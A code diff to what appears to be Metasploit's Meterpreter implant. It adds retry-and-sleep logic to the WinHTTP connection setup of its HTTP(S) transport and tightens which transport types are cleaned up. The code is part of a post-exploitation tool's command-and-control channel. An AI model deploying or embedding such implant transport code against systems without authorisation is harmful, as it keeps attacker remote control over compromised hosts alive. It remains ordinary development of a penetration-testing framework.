@@ -646,66 +646,83 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
  */
 static BOOL server_init_winhttp(Transport* transport)
 {
+	BOOL result = FALSE;
 	URL_COMPONENTS bits;
 	wchar_t tmpHostName[URL_SIZE];
 	wchar_t tmpUrlPath[URL_SIZE];
 	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
 
-	dprintf("[WINHTTP] Initialising ...");
+	int start = current_unix_timestamp();
 
-	// configure proxy
-	if (ctx->proxy)
+	do
 	{
-		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
-		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
-	}
-	else
-	{
-		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-	}
+		dprintf("[WINHTTP] Initialising ...");
+		if (ctx->internet)
+		{
+			WinHttpCloseHandle(ctx->internet);
+			ctx->internet = NULL;
+		}
 
-	if (!ctx->internet)
-	{
-		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
-		return FALSE;
-	}
+		// configure proxy
+		if (ctx->proxy)
+		{
+			dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
+			ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
+		}
+		else
+		{
+			ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+		}
 
-	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);
+		if (ctx->internet)
+		{
+			dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);
 
-	// The InternetCrackUrl method was poorly designed...
-	ZeroMemory(tmpHostName, sizeof(tmpHostName));
-	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));
+			// The InternetCrackUrl method was poorly designed...
+			ZeroMemory(tmpHostName, sizeof(tmpHostName));
+			ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));
 
-	ZeroMemory(&bits, sizeof(bits));
-	bits.dwStructSize = sizeof(bits);
+			ZeroMemory(&bits, sizeof(bits));
+			bits.dwStructSize = sizeof(bits);
 
-	bits.dwHostNameLength = URL_SIZE - 1;
-	bits.lpszHostName = tmpHostName;
+			bits.dwHostNameLength = URL_SIZE - 1;
+			bits.lpszHostName = tmpHostName;
 
-	bits.dwUrlPathLength = URL_SIZE - 1;
-	bits.lpszUrlPath = tmpUrlPath;
+			bits.dwUrlPathLength = URL_SIZE - 1;
+			bits.lpszUrlPath = tmpUrlPath;
 
-	dprintf("[DISPATCH] About to crack URL: %S", transport->url);
-	WinHttpCrackUrl(transport->url, 0, 0, &bits);
+			dprintf("[DISPATCH] About to crack URL: %S", transport->url);
+			WinHttpCrackUrl(transport->url, 0, 0, &bits);
 
-	SAFE_FREE(ctx->uri);
-	ctx->uri = _wcsdup(tmpUrlPath);
-	transport->comms_last_packet = current_unix_timestamp();
+			SAFE_FREE(ctx->uri);
+			ctx->uri = _wcsdup(tmpUrlPath);
+			transport->comms_last_packet = current_unix_timestamp();
 
-	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
-	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);
+			dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
+			dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);
 
-	// Allocate the connection handle
-	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
-	if (!ctx->connection)
-	{
-		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
-		return FALSE;
-	}
+			// Allocate the connection handle
+			ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
+			if (ctx->connection)
+			{
+				result = TRUE;
+				dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);
+				break;
+			}
 
-	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);
+			dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
+		}
+		else
+		{
+			dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
+		}
 
-	return TRUE;
+		dprintf("[WINHTTP] Failed to get a valid connection, sleeping for %u s", transport->timeouts.retry_total);
+		sleep(transport->timeouts.retry_wait);
+
+	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < transport->timeouts.retry_total);
+
+	return result;
 }
 
 /*!
@@ -891,7 +908,7 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
  */
 static void transport_destroy_http(Transport* transport)
 {
-	if (transport && transport->type != METERPRETER_TRANSPORT_SSL)
+	if (transport && (transport->type == METERPRETER_TRANSPORT_HTTP || transport->type == METERPRETER_TRANSPORT_HTTPS))
 	{
 		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
 
